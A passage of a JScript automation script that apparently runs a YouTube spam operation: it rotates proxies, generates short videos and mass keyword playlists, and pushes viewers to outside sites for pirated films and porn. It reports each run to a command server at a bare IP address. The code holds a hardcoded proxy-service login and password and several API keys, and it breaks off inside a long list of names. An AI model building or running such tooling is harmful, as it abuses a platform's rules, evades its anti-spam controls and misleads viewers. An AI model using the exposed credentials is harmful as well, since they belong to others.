var used = "";
var maximize = true;
var prevListID = '';
if (WScript.Arguments.length==0) {
    log("Available modes are:");
    log("adult");
    log("films");
    log("serials");
    log("wt");
    WScript.Quit();
}

var ie = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
var global_channel_id = "";

var iexml = new ActiveXObject("Microsoft.XMLHttp");
ie.SetTimeouts(1800000, 1800000, 1800000, 1800000);
fso = new ActiveXObject("Scripting.FileSystemObject");
var me = fso.getParentFolderName(WScript.ScriptFullName);
var shell = new ActiveXObject("WScript.Shell");
shell.CurrentDirectory = me;
var ieb;
var sessionFolder = "";

if(!fso.fileExists(me +"/session/"+shell.ExpandEnvironmentStrings("%USERNAME%")+"/new_acc.txt")) {
    log("noacc");
    WScript.Sleep(5000);
    shell.Run("tskill cmd2", 1, true);
}

JSON = {
    parse: function(sJSON) { return eval('(' + sJSON + ')'); },
    stringify: function(vContent) {
        if (vContent instanceof Object) {
            var sOutput = '';
            if (vContent.constructor === Array) {
                for (var nId = 0; nId < vContent.length; sOutput += this.stringify(vContent[nId]) + ',', nId++);
                return '[' + sOutput.substr(0, sOutput.length - 1) + ']';
            }
            if (vContent.toString !== Object.prototype.toString) {
                return '"' + vContent.toString().replace(/"/g, '\\$&') + '"';
            }
            for (var sProp in vContent) {
                sOutput += '"' + sProp.replace(/"/g, '\\$&') + '":' + this.stringify(vContent[sProp]) + ',';
            }
            return '{' + sOutput.substr(0, sOutput.length - 1) + '}';
        }
        return typeof vContent === 'string' ? '"' + vContent.replace(/"/g, '\\$&') + '"' : String(vContent);
    }
};
function session() {
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var me = fso.getParentFolderName(WScript.ScriptFullName);
    log("local storage Now File is: "+me + "\\session\\" +sessionFolder+arguments[0]+".txt");
    if (arguments.length==1)
        return JSON.parse(fso.getFile(me + "\\session\\" +sessionFolder+ arguments[0] + ".txt").OpenAsTextStream(1,0).readall());
    else if (arguments.length==2) {
        var out = fso.CreateTextFile(me + "\\session\\"+sessionFolder + arguments[0] + ".txt");
        out.Write(JSON.stringify(arguments[1]));
        out.close();
    }
    else
        WScript.Echo("Error session usage");
}
function globalSession() {
    log("GLOBAL Now File is: "+arguments[0]+".txt");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var me = fso.getParentFolderName(WScript.ScriptFullName);
    if (arguments.length==1)
        return JSON.parse(fso.getFile(me + "\\session\\" + arguments[0] + ".txt").OpenAsTextStream(1,0).readall());
    else if (arguments.length==2) {
        var out = fso.CreateTextFile(me + "\\session\\" + arguments[0] + ".txt");
        out.Write(JSON.stringify(arguments[1]));
        out.close();
    }
    else
        WScript.Echo("Error session usage");
}

function userSession() {
    var userFolder = shell.ExpandEnvironmentStrings("%USERNAME%")
    log("USER Now File is: "+userFolder + "\\" + arguments[0]+".txt");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var me = fso.getParentFolderName(WScript.ScriptFullName);
    log()
    if (arguments.length==1)
        return JSON.parse(fso.getFile(me + "\\session\\" + userFolder + "\\" + arguments[0] + ".txt").OpenAsTextStream(1,0).readall());
    else if (arguments.length==2) {
        var out = fso.CreateTextFile(me + "\\session\\"+userFolder + "\\" + arguments[0] + ".txt");
        out.Write(JSON.stringify(arguments[1]));
        out.close();
    }
    else
        WScript.Echo("Error session usage");
}

function log(text) {WScript.Echo(text);}
function setProxy() {
    ie.open("GET", "http://account.fineproxy.org/api/getproxy/?format=txt&type=socksip&login=RUS189423&password=qR2aQH8Fc0", 0)
    ie.send();
    proxyLen = ie.responseText.split("\r\n").length -1;
    for (var i=0;i<proxyLen;i++) {
        var currentProxy = (ie.responseText.split("\r\n")[i]);
        var usedList = globalSession("usedProxy");
        if (usedList[currentProxy] != 1)
            break;
    }
    if(i == proxyLen){
        WScript.Echo("NO MORE IP LEFT!!!");
        globalSession("usedProxy", {});
        shell.Run(me + "/ProxyToggle.exe", 1, true);
        WScript.Quit();
    }
    usedList[currentProxy] = 1;
    globalSession("usedProxy", usedList);
    WScript.Echo(currentProxy)
    shell.Run(me + "/ProxyToggle.exe socks="+currentProxy, 1, true);
}
var country = ["Australia", "Belgium", "Canada", "Switzerland", "Czech Republic", "Germany", "Denmark", "Spain", "Finland", "France", "UK", "Hong Kong", "Hungary", "Ireland", "Israel", "Iceland", "Italy", "Japan", "Lithuania", "Luxembourg", "Mexico", "Netherlands", "Norway", "Poland", "Romania", "Sweden", "Singapore", "u.s.a", "Austria"];
// Generate Objects Block
var photo_file = [];
_files = new Enumerator(fso.getFolder(me+"/pics_p").Files);
for (; !_files.atEnd(); _files.moveNext()) {
    photo_file.push(_files.item());
}
var langArr, keywordsObject, descrTextArr, login_state;
var _errorsCounter = 0;
var keywordsObject = new keywordsClass();



// sessionFolder = "porn\\";
// log(keywordsObject.readBase(me + "\\keys_p_new.txt", 4000, "porn"))

//keywordsObject.resetBase();
var browser = new browserClass();
var mouseActions = new mouseEvents();
var ajax = new ajaxClass();

/////////debug block
// browser.browserDebug();
///////////deleteplaylists
// ajax.deletePlaylists();
// WScript.Quit();
//////////
function replaceLang(lang){
    if(lang == "ru")
        return "ru";
    else
        return "en";
}
function rotateData(counterName, arr){
    var currentIndex = session(counterName);
    if(currentIndex >= arr.length-1)
        session(counterName, 0);
    else
        session(counterName, currentIndex + 1);
    return arr[currentIndex];
}
function eachAccount(filePath, callback) {
    var yt_accs = fso.getFile(filePath).OpenAsTextStream(1,0).readAll().split("\r\n");
    for(var a=0;a<yt_accs.length;a++){
        callback(yt_accs[a].split(";")[0], yt_accs[a].split(";")[1]);
    }
}

var translateArr, nowTranslateKey;
translateArr = globalSession("translateArr");

function uploadFilmsScenario(loginData) {
    keywordsObject.mixing = true;
    shortPathArr = [
        //"http://37.59.246.141/youtube/?act=getkino720&login=igor123aaa&appkey=R_3d47d627386e4521a5cf60d7424412d8",
        "http://37.59.246.141/youtube/?act=getkino720&login=trussss&appkey=R_cd095da8cb8187378440fae72f266520",
        "http://37.59.246.141/youtube/?act=getkino720&login=angelicakozlov&appkey=R_639c47077c7b42cbbb67d4e10b38bfd0",
        "http://37.59.246.141/youtube/?act=getkino720&login=demiandark&appkey=R_362c2378ffd742d0ab01574de59ba30d",
        "http://37.59.246.141/youtube/?act=getkino720&login=oscorp&appkey=R_6bfce689d8bc49909b284d563b787929",
        "http://37.59.246.141/youtube/?act=getkino720&login=pochtomatsuka&appkey=R_5251b09cbadf4bed8c26304d059ff50c"
    ];
    sessionFolder = "film\\";
    var yearsArr = ["2015", "2014", "2013", "2012", "2011", "2010", "2009"];
    var currentYear = rotateData("yearsArr", yearsArr);
    currentYear = "2015";
    descrTextArr = ["смотреть","просмотр","войти","переход","заход","заходи","налетай","посмотри","тут","здесь","нажимай","жми","кликай","кино","кинчик","кин","кинуха","фильм","фильма","фильмец","kino","film","онлайн","online","качество","в качестве","сайт","вход","войти","перейти","к нам","у нас","контент","видео","видос","видеофильм"];
    var video_params = {
        firstPicText: "Этот фильм в HD качестве\\nмы перенесли на наш портал\\nпо ссылке в описании под видео.",
        // firstPicText: "YouTube удаляет этот фильм.\\n\\nПоэтому мы разместили его\\nв HD качестве\\nна нашем сайте\\nпо ссылке внизу в описании.",
        secondPicText: "SOUND PRODUCERS\\nAlex Badwin\\nAdren Body\\nTony Richman\\nAllan Arkon",
        allowDescription: true,
        f_time: function() {return parseInt(4800000 + Math.random() * 1200000)*0.1;},
        s_time: function() {return parseInt(4800000 + Math.random() * 1200000)*0.9;},
        videoCount: 20,
        videoNamePrefix: "",
        shortPath: rotateData("shortPathArr", shortPathArr),
        linkDescription: rotateData("descrTextArr", descrTextArr)
    };
    log(me + "\\keys_f_"+currentYear+".txt")
    //nowTranslateKey = rotateData("translateArr", translateArr);
    var videoIdList = ajax.createTextVideo(video_params);
    ajax.createPlaylist({
        videoIdList: videoIdList,
        keywordsFile: me + "\\keys_f_"+currentYear+".txt",
        translateTo: "none",
        keywordsCount: 1000,
        keywordsTitleMode: "film",
        playlistCount: 1000
    });
    ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=newdescr&phone="+loginData+"&descr="+video_params.videoCount+"x1000 film","","");
    ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=setstate&state=short_adult&phone="+loginData, "","");
    ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=newtime&phone="+loginData, "","");
}
function uploadSerialScenario(loginData) {

    keywordsObject.mixing = true;
    shortPathArr = [
        //"http://37.59.246.141/youtube/?act=getkino720&login=igor123aaa&appkey=R_3d47d627386e4521a5cf60d7424412d8",
        "http://37.59.246.141/youtube/?act=getkino720&login=trussss&appkey=R_cd095da8cb8187378440fae72f266520",
        "http://37.59.246.141/youtube/?act=getkino720&login=angelicakozlov&appkey=R_639c47077c7b42cbbb67d4e10b38bfd0",
        "http://37.59.246.141/youtube/?act=getkino720&login=demiandark&appkey=R_362c2378ffd742d0ab01574de59ba30d",
        "http://37.59.246.141/youtube/?act=getkino720&login=oscorp&appkey=R_6bfce689d8bc49909b284d563b787929",
        "http://37.59.246.141/youtube/?act=getkino720&login=pochtomatsuka&appkey=R_5251b09cbadf4bed8c26304d059ff50c"
    ];
    sessionFolder = "serial\\";
    descrTextArr = ["смотреть","просмотр","войти","переход","заход","заходи","налетай","посмотри","тут","здесь","нажимай","жми","кликай","кино","кинчик","кин","кинуха","фильм","фильма","фильмец","kino","film","онлайн","online","качество","в качестве","сайт","вход","войти","перейти","к нам","у нас","контент","видео","видос","видеофильм"];
    var video_params = {
        firstPicText: "Этот сериал в HD качестве\\nмы перенесли на наш портал\\nпо ссылке в описании под видео.",
        // firstPicText: "YouTube удаляет этот фильм.\\n\\nПоэтому мы разместили его\\nв HD качестве\\nна нашем сайте\\nпо ссылке внизу в описании.",
        secondPicText: "SOUND PRODUCERS\\nAlex Bandwin\\nAdrey Bady\\nTony Rickman\\nAllan Archkon",
        allowDescription: true,
        f_time: function() {return parseInt(2100000 + Math.random() * 1200000)*0.1;},
        s_time: function() {return parseInt(2400000 + Math.random() * 1200000)*0.9;},
        videoCount: 20,
        videoNamePrefix: "",
        shortPath: rotateData("shortPathArr", shortPathArr),
        linkDescription: rotateData("descrTextArr", descrTextArr)
    };
    log(me + "\\keys_p_serial.txt")
    //nowTranslateKey = rotateData("translateArr", translateArr);
    var videoIdList = ajax.createTextVideo(video_params);
    ajax.createPlaylist({
        videoIdList: videoIdList,
        keywordsFile: me + "\\keys_p_serial.txt",
        translateTo: "none",
        keywordsCount: 1000,
        keywordsTitleMode: "serial",
        playlistCount: 1000
    });
    ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=newdescr&phone="+loginData+"&descr="+video_params.videoCount+"x1000 serial","","");
    ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=setstate&state=short_adult&phone="+loginData, "","");
    ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=newtime&phone="+loginData, "","");
}
function uploadPornScenario(loginData){
    var chk_state;
    sessionFolder = "porn\\";
    keywordsObject.mixing = true;
    descrTextArr = {
        ru: ["Анастасия","Марина","Мирослава","Марьяна","Анна","Светлана","Галина","Анжелика","Мария","Варвара","Людмила","Нелли","Елена","Софья","Валентина","Влада","Дарья","Диана","Нина","Виталина","Алина","Яна","Эмилия","Майя","Ирина","Кира","Камилла","Тамара","Екатерина","Ангелина","Альбина","Мелания","Арина","Маргарита","Лилия","Лиана","Полина","Ева","Любовь","Василина","Ольга","Алёна","Лариса","Зарина","Юлия","Дарина","Эвелина","Алия","Татьяна","Карина","Инна","Владислава","Наталья","Василиса","Агата","Самира","Виктория","Олеся","Амелия","Антонина","Елизавета","Аделина","Амина","Ника","Ксения","Оксана","Эльвира","Мадина","Милана","Таисия","Ярослава","Наташа","Вероника","Надежда","Стефания","Снежана","Алиса","Евгения","Регина","Каролина","Валерия","Элина","Алла","Юлиана","Александра","Злата","Виолетта","Ариана","Ульяна","Есения","Лидия","Эльмира","Кристина","Милена","Амалия","Ясмина","София","Вера","Наталия","Жанна"], en: ["Emma","Olivia","Sophia","Ava","Isabella","Mia","Abigail","Emily","Charlotte","Harper","Madison","Amelia","Elizabeth","Sofia","Evelyn","Avery","Chloe","Ella","Grace","Victoria","Aubrey","Scarlett","Zoey","Addison","Lily","Lillian","Natalie","Hannah","Aria","Layla","Brooklyn","Alexa","Zoe","Penelope","Riley","Leah","Audrey","Savannah","Allison","Samantha","Nora","Skylar","Camila","Anna","Paisley","Ariana","Ellie","Aaliyah","Claire","Violet","Stella","Sadie","Mila","Gabriella","Lucy","Arianna","Kennedy","Sarah","Madelyn","Eleanor","Kaylee","Caroline","Hazel","Hailey","Genesis","Kylie","Autumn","Piper","Maya","Nevaeh","Serenity","Peyton","Mackenzie","Bella","Eva","Taylor","Naomi","Aubree","Aurora","Melanie","Lydia","Brianna","Ruby","Katherine","Ashley","Alexis","Alice","Cora","Julia","Madeline","Faith","Annabelle","Alyssa","Isabelle","Vivian","Gianna","Quinn","Clara","Reagan","Khloe","Alexandra","Hadley","Eliana","Sophie","London","Elena","Kimberly","Bailey","Maria","Luna","Willow","Jasmine","Kinsley","Valentina","Kayla","Delilah","Andrea","Natalia","Lauren","Morgan","Rylee","Sydney","Adalynn","Mary","Ximena","Jade","Liliana","Brielle","Ivy","Trinity","Josephine","Adalyn","Jocelyn","Emery","Adeline","Jordyn","Ariel","Everly","Lilly","Paige","Isla","Lyla","Makayla","Molly","Emilia","Mya","Kendall","Melody","Isabel","Brooke","Mckenzie","Nicole","Payton","Margaret","Mariah","Eden","Athena","Amy","Norah","Londyn","Valeria","Sara","Aliyah","Angelina","Gracie","Rose","Rachel","Juliana","Laila","Brooklynn","Valerie","Alina","Reese","Elise","Eliza","Alaina","Raelynn","Leilani","Catherine","Emerson","Cecilia","Genevieve","Daisy","Harmony","Vanessa","Adriana","Presley","Rebecca","Destiny","Hayden","Julianna","Michelle","Adelyn","Arabella","Summer","Callie","Kaitlyn","Ryleigh","Lila","Daniela","Arya","Alana","Esther","Finley","Gabrielle","Jessica","Charlie","Stephanie","Tessa","Makenzie","Ana","Amaya","Alexandria","Alivia","Nova","Anastasia","Iris","Marley","Fiona","Angela","Giselle","Kate","Alayna","Lola","Lucia","Juliette","Parker","Teagan","Sienna","Georgia","Hope","Cali","Vivienne","Izabella","Kinley","Daleyza","Kylee","Jayla","Katelyn","Juliet","Maggie","Dakota","Delaney","Brynlee","Keira","Camille","Leila","Mckenna","Aniyah","Noelle","Josie","Jennifer","Melissa","Gabriela","Allie","Eloise","Cassidy","Jacqueline","Brynn","Sawyer","Evangeline","Jordan","Paris","Olive","Ayla","Rosalie","Kali","Maci","Gemma","Lilliana","Raegan","Lena","Adelaide","Journey","Adelynn","Alessandra","Kenzie","Miranda","Haley","June","Harley","Charlee","Lucille","Talia","Skyler","Makenna","Phoebe","Jane","Lyric","Angel","Elaina","Adrianna","Ruth","Miriam","Diana","Mariana","Danielle","Jenna","Shelby","Nina","Madeleine","Elliana","Amina","Amiyah","Chelsea","Joanna","Jada","Lexi","Katie","Maddison","Fatima","Vera","Malia","Lilah","Madilyn","Amanda","Daniella","Alexia","Kathryn","Paislee","Selena","Laura","Annie","Nyla","Catalina","Kayleigh","Sloane","Kamila","Lia","Haven","Rowan","Ashlyn","Christina","Amber","Myla","Addilyn","Erin","Alison","Ainsley","Raelyn","Cadence","Kendra","Heidi","Kelsey","Nadia","Alondra","Cheyenne","Kaydence","Mikayla","River","Heaven","Arielle","Lana","Blakely","Sabrina","Kyla","Ada","Gracelyn","Allyson","Felicity","Kira","Briella","Kamryn","Adaline","Alicia","Ember","Aylin","Veronica","Esmeralda","Sage","Leslie","Aspen","Gia","Camilla","Ashlynn","Scarlet","Journee","Daphne","Bianca","Mckinley","Amira","Carmen","Kyleigh","Megan","Skye","Elsie","Kennedi","Averie","Carly","Rylie","Gracelynn","Mallory","Emersyn","Logan","Camryn","Annabella","Dylan","Elle","Kiara","Yaretzi","Ariella","Zara","April","Gwendolyn","Anaya","Baylee","Brinley","Sierra","Annalise","Tatum","Serena","Dahlia","Macy","Miracle","Madelynn","Briana","Freya","Macie","Helen","Bethany","Leia","Harlow","Blake","Jayleen","Angelica","Marilyn","Viviana","Francesca","Juniper","Carolina","Jazmin","Emely","Maliyah","Cataleya","Jillian","Joy","Abby","Malaysia","Nylah","Sarai","Evelynn","Nia","Zuri","Addyson","Aleah","Kaia","Bristol","Lorelei","Jazmine","Maeve","Alejandra","Justice","Julie","Marlee","Phoenix","Jimena","Emmalyn","Nayeli","Aleena","Brittany","Amara","Karina","Giuliana","Thea","Braelynn","Kassidy","Braelyn","Luciana","Aubrie","Janelle","Madisyn","Brylee","Leighton","Ryan","Amari","Eve","Millie","Kelly","Selah","Lacey","Willa","Haylee","Jaylah","Sylvia","Melany","Elisa","Elsa","Hattie","Raven","Holly","Aisha","Itzel","Kyra","Tiffany","Jayda","Michaela","Madilynn","Jamie","Celeste","Lilian","Remi","Priscilla","Jazlyn","Karen","Savanna","Zariah","Lauryn","Alanna","Kara","Karla","Cassandra","Ariah","Evie","Frances","Aileen","Lennon","Charley","Rosemary","Danna","Regina","Kaelyn","Virginia","Hanna","Rebekah","Alani","Edith","Liana","Charleigh","Gloria","Cameron","Colette","Kailey","Carter","Helena","Matilda","Imani","Bridget","Cynthia","Janiyah","Marissa","Johanna","Sasha","Kaliyah","Cecelia","Adelina","Jessa","Hayley","Julissa","Winter","Crystal","Kaylie","Bailee","Charli","Henley","Anya","Maia","Skyla","Liberty","Fernanda","Monica","Braylee","Dallas","Mariam","Marie","Beatrice","Hallie","Maryam","Angelique","Anne","Madalyn","Alayah","Annika","Greta","Lilyana","Kadence","Coraline","Lainey","Mabel","Lillie","Anika","Azalea","Dayana","Jaliyah","Addisyn","Emilee","Mira","Angie","Lilith","Mae","Meredith","Guadalupe","Emelia","Margot","Melina","Aniya","Alena","Myra","Elianna","Caitlyn","Jaelynn","Jaelyn","Demi","Mikaela","Tiana","Blair","Shiloh","Ariyah","Saylor","Caitlin","Lindsey","Oakley","Alia","Everleigh","Ivanna","Miah","Emmy","Jessie","Anahi","Kaylin","Ansley","Annabel","Remington","Kora","Maisie","Nathalie","Emory","Karsyn","Pearl","Irene","Kimber","Rosa","Lylah","Magnolia","Samara","Elliot","Renata","Galilea","Kensley","Kiera","Whitney","Amelie","Siena","Bria","Laney","Perla","Tatiana","Zelda","Jaycee","Kori","Montserrat","Lorelai","Adele","Elyse","Katelynn","Kynlee","Marina","Jayden","Kailyn","Avah","Kenley","Aviana","Armani","Dulce","Alaia","Teresa","Natasha","Milani","Amirah","Breanna","Linda","Tenley","Sutton","Elaine","Elliott","Aliza","Kenna","Meadow","Alyson","Rory","Milana","Erica","Esme","Leona","Joselyn","Madalynn","Alma","Chanel","Myah","Karter","Zahra","Audrina","Ariya","Jemma","Eileen","Kallie","Milan","Emmalynn","Lailah","Sloan","Clarissa","Karlee","Laylah","Amiya","Collins","Ellen","Hadassah","Danica","Jaylene","Averi","Reyna","Saige","Wren","Lexie","Dorothy","Lilianna","Monroe","Aryanna","Elisabeth","Ivory","Liv","Janessa","Jaylynn","Livia","Rayna","Alaya","Malaya","Cara","Erika","Amani","Clare","Addilynn","Roselyn","Corinne","Paola","Jolene","Anabelle","Aliana","Lea","Mara","Lennox","Claudia","Kristina","Jaylee","Kaylynn","Zariyah","Gwen","Kinslee","Avianna","Lisa","Raquel","Jolie","Carolyn","Courtney","Penny","Royal","Alannah","Ciara","Chaya","Kassandra","Milena","Mina","Noa","Leanna","Zoie","Ariadne","Monserrat","Nola","Carlee","Isabela","Jazlynn","Kairi","Laurel","Sky","Rosie","Arely","Aubrielle","Kenia","Noemi","Scarlette","Farrah","Leyla","Amia","Bryanna","Naya","Wynter","Hunter","Katalina","Taliyah","Amaris","Emerie","Martha","Thalia","Christine","Estrella","Brenna","Milania","Salma","Lillianna","Marjorie","Shayla","Zendaya","Aurelia","Brenda","Julieta","Adilynn","Deborah","Keyla","Patricia","Emmeline","Hadlee","Giovanna","Kailee","Desiree","Casey","Karlie","Khaleesi","Lara","Tori","Clementine","Nancy","Simone","Ayleen","Estelle","Celine","Madyson","Zaniyah","Adley","Amalia","Paityn","Kathleen","Sandra","Lizbeth","Maleah","Micah","Aryana","Hailee","Aiyana","Joyce","Ryann","Caylee","Kalani","Marisol","Nathaly","Briar","Holland","Lindsay","Remy","Adrienne","Azariah","Harlee","Dana","Frida","Marianna","Yamileth","Chana","Kaya","Lina","Celia","Analia","Hana","Jayde","Joslyn","Romina","Anabella","Barbara","Bryleigh","Emilie","Nathalia","Ally","Evalyn","Bonnie","Zaria","Carla","Estella","Kailani","Rivka","Rylan","Paulina","Kayden","Giana","Yareli","Kaiya","Sariah","Avalynn","Jasmin","Aya","Jewel","Kristen","Paula","Astrid","Jordynn","Kenya","Ann","Annalee","Kai","Kiley","Marleigh","Julianne","Zion","Emmaline","Nataly","Aminah","Amya","Iliana","Jaida","Paloma","Asia","Louisa","Sarahi","Tara","Andi","Arden","Dalary","Aimee","Alisson","Halle","Aitana","Landry","Alisha","Elin","Maliah","Belen","Briley","Raina","Vienna","Esperanza","Judith","Faye","Susan","Aliya","Aranza","Yasmin","Jaylin","Kyndall","Saniyah","Wendy","Yaritza","Azaria","Kaelynn","Neriah","Zainab","Alissa","Cherish","Dixie","Veda","Nala","Tabitha","Cordelia","Ellison","Meilani","Angeline","Reina","Tegan","Hadleigh","Harmoni","Kimora","Ingrid","Lilia","Luz","Aislinn","America","Ellis","Elora","Heather","Natalee","Miya","Heavenly","Jenny","Aubriella","Emmalee","Kensington","Kiana","Lilyanna","Tinley","Ophelia","Moriah","Sharon","Charlize","Abril","Avalyn","Mariyah","Taya","Ireland","Lyra","Noor","Sariyah","Giavanna","Stevie","Rhea","Zaylee","Denise","Frankie","Janiya","Jocelynn","Libby","Aubrianna","Kaitlynn","Princess","Sidney","Alianna"]};
    shortPathArr = [
        //"http://37.59.246.141/youtube/?act=getadult&login=igor123aaa&appkey=R_3d47d627386e4521a5cf60d7424412d8",
        "http://37.59.246.141/youtube/?act=getadultnew&login=trussss&appkey=R_cd095da8cb8187378440fae72f266520",
        "http://37.59.246.141/youtube/?act=getadultnew&login=angelicakozlov&appkey=R_639c47077c7b42cbbb67d4e10b38bfd0",
        "http://37.59.246.141/youtube/?act=getadultnew&login=demiandark&appkey=R_362c2378ffd742d0ab01574de59ba30d",
        "http://37.59.246.141/youtube/?act=getadultnew&login=oscorp&appkey=R_6bfce689d8bc49909b284d563b787929",
        "http://37.59.246.141/youtube/?act=getadultnew&login=pochtomatsuka&appkey=R_5251b09cbadf4bed8c26304d059ff50c"
    ];
    log("uploadPornScenario()");
    langArr = ["no","cs","de","da","fi","sv","et","fr","nl","el","lt","it","es","pt","tr","pl"];//["en","ru","de","it","es","nl","pt","fr"];
    langKeywords = rotateData("langArr", langArr);
    langKeywords = "en"; // !!!!!!!!!!!!!!!!!!!!!!!
    langDescr = replaceLang(langKeywords);

    var video_params = {
        photoArrayPath: photo_file,
        firstPicText: (langKeywords =="ru")?"Полное порно видео смотрите\\nпо ссылке в описании":"To Watch full porn video follow\\nthe link below in the description",
        allowDescription: true,
        videoCount: 2,
        videoNamePrefix: "",
        shortPath: rotateData("shortPathArr", shortPathArr),
        linkDescription: rotateData("descrTextArr"+langDescr, descrTextArr[langDescr])
    };
    nowTranslateKey = rotateData("translateArr", translateArr);

    var videoIdList = browser.getExistingVideos();
    if (videoIdList.length == 0) {

        var chk_state = ajax.generateVideoFromImage(video_params);
        if(chk_state == "again"){
            browser.youtube.checkingChannelExistence();

            mouseActions.closeFlash();
            chk_state = ajax.generateVideoFromImage(video_params);
            if(chk_state == "again")
                shell.Run("tskill cmd2", 1, true);
        }
        videoIdList = ajax.cloneVideo(video_params);
    }


    log("videoIdListvideoIdListvideoIdList: "+ videoIdList)
    // var videoIdList = ["DL11rSTagUk","TLNGpRhfmgU"]
    // ajax.createPlaylist({

    browser.createPlaylist({ // PRN
        videoIdList: videoIdList,
        keywordsFile: me + "\\keys_p_en.txt",  //can be used + langKeywords + instead of en
        translateTo: "none", // langKeywords
        keywordsCount: 1000,
        keywordsTitleMode: "porn",
        playlistCount: (langKeywords=="ru"||langKeywords=="en")?100:400
    });
    ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=newdescr&phone="+loginData+"&descr="+video_params.videoCount+"x10 porn "+langKeywords+" "+video_params.linkDescription,"","");
    ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=setstate&state=short_adult&phone="+loginData, "","");
    ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=newtime&phone="+loginData, "","");
}
function changeInfoAllScenario(loginData){
    // ONLY FOR DEBUG
    sessionFolder = "porn\\"
    shortPathArr = [
        //"http://37.59.246.141/youtube/?act=getadult&login=igor123aaa&appkey=R_3d47d627386e4521a5cf60d7424412d8",
        "http://37.59.246.141/youtube/?act=getadultnew&login=trussss&appkey=R_cd095da8cb8187378440fae72f266520",
        "http://37.59.246.141/youtube/?act=getadultnew&login=angelicakozlov&appkey=R_639c47077c7b42cbbb67d4e10b38bfd0",
        "http://37.59.246.141/youtube/?act=getadultnew&login=demiandark&appkey=R_362c2378ffd742d0ab01574de59ba30d",
        "http://37.59.246.141/youtube/?act=getadultnew&login=oscorp&appkey=R_6bfce689d8bc49909b284d563b787929",
        "http://37.59.246.141/youtube/?act=getadultnew&login=pochtomatsuka&appkey=R_5251b09cbadf4bed8c26304d059ff50c"
    ];
    langDescr = "en";
    descrTextArr = {
        en: ["Анастасия","Марина","Мирослава","Марьяна","Анна","Светлана","Галина","Анжелика","Мария","Варвара","Людмила","Нелли","Елена","Софья","Валентина","Влада","Дарья","Диана","Нина","Виталина","Алина","Яна","Эмилия","Майя","Ирина","Кира","Камилла","Тамара","Екатерина","Ангелина","Альбина","Мелания","Арина","Маргарита","Лилия","Лиана","Полина","Ева","Любовь","Василина","Ольга","Алёна","Лариса","Зарина","Юлия","Дарина","Эвелина","Алия","Татьяна","Карина","Инна","Владислава","Наталья","Василиса","Агата","Самира","Виктория","Олеся","Амелия","Антонина","Елизавета","Аделина","Амина","Ника","Ксения","Оксана","Эльвира","Мадина","Милана","Таисия","Ярослава","Наташа","Вероника","Надежда","Стефания","Снежана","Алиса","Евгения","Регина","Каролина","Валерия","Элина","Алла","Юлиана","Александра","Злата","Виолетта","Ариана","Ульяна","Есения","Лидия","Эльмира","Кристина","Милена","Амалия","Ясмина","София","Вера","Наталия","Жанна"]
    }
    var video_params = {
        shortPath: rotateData("shortPathArr", shortPathArr),
        videoCount: 20,
        videoNamePrefix: "",
        allowDescription: true,
        linkDescription: rotateData("descrTextArr"+langDescr, descrTextArr[langDescr])
    };
    ajax.changeInfoAll(video_params);
}


function uploadPornNOPLScenario(loginData){
    var chk_state;
    sessionFolder = "porn\\";
    keywordsObject.mixing = false;
    keywordsObject.enableLoop = false;

    descrTextArr = {
        ru: ["Анастасия","Марина","Мирослава","Марьяна","Анна","Светлана","Галина","Анжелика","Мария","Варвара","Людмила","Нелли","Елена","Софья","Валентина","Влада","Дарья","Диана","Нина","Виталина","Алина","Яна","Эмилия","Майя","Ирина","Кира","Камилла","Тамара","Екатерина","Ангелина","Альбина","Мелания","Арина","Маргарита","Лилия","Лиана","Полина","Ева","Любовь","Василина","Ольга","Алёна","Лариса","Зарина","Юлия","Дарина","Эвелина","Алия","Татьяна","Карина","Инна","Владислава","Наталья","Василиса","Агата","Самира","Виктория","Олеся","Амелия","Антонина","Елизавета","Аделина","Амина","Ника","Ксения","Оксана","Эльвира","Мадина","Милана","Таисия","Ярослава","Наташа","Вероника","Надежда","Стефания","Снежана","Алиса","Евгения","Регина","Каролина","Валерия","Элина","Алла","Юлиана","Александра","Злата","Виолетта","Ариана","Ульяна","Есения","Лидия","Эльмира","Кристина","Милена","Амалия","Ясмина","София","Вера","Наталия","Жанна"], en: ["Emma","Olivia","Sophia","Ava","Isabella","Mia","Abigail","Emily","Charlotte","Harper","Madison","Amelia","Elizabeth","Sofia","Evelyn","Avery","Chloe","Ella","Grace","Victoria","Aubrey","Scarlett","Zoey","Addison","Lily","Lillian","Natalie","Hannah","Aria","Layla","Brooklyn","Alexa","Zoe","Penelope","Riley","Leah","Audrey","Savannah","Allison","Samantha","Nora","Skylar","Camila","Anna","Paisley","Ariana","Ellie","Aaliyah","Claire","Violet","Stella","Sadie","Mila","Gabriella","Lucy","Arianna","Kennedy","Sarah","Madelyn","Eleanor","Kaylee","Caroline","Hazel","Hailey","Genesis","Kylie","Autumn","Piper","Maya","Nevaeh","Serenity","Peyton","Mackenzie","Bella","Eva","Taylor","Naomi","Aubree","Aurora","Melanie","Lydia","Brianna","Ruby","Katherine","Ashley","Alexis","Alice","Cora","Julia","Madeline","Faith","Annabelle","Alyssa","Isabelle","Vivian","Gianna","Quinn","Clara","Reagan","Khloe","Alexandra","Hadley","Eliana","Sophie","London","Elena","Kimberly","Bailey","Maria","Luna","Willow","Jasmine","Kinsley","Valentina","Kayla","Delilah","Andrea","Natalia","Lauren","Morgan","Rylee","Sydney","Adalynn","Mary","Ximena","Jade","Liliana","Brielle","Ivy","Trinity","Josephine","Adalyn","Jocelyn","Emery","Adeline","Jordyn","Ariel","Everly","Lilly","Paige","Isla","Lyla","Makayla","Molly","Emilia","Mya","Kendall","Melody","Isabel","Brooke","Mckenzie","Nicole","Payton","Margaret","Mariah","Eden","Athena","Amy","Norah","Londyn","Valeria","Sara","Aliyah","Angelina","Gracie","Rose","Rachel","Juliana","Laila","Brooklynn","Valerie","Alina","Reese","Elise","Eliza","Alaina","Raelynn","Leilani","Catherine","Emerson","Cecilia","Genevieve","Daisy","Harmony","Vanessa","Adriana","Presley","Rebecca",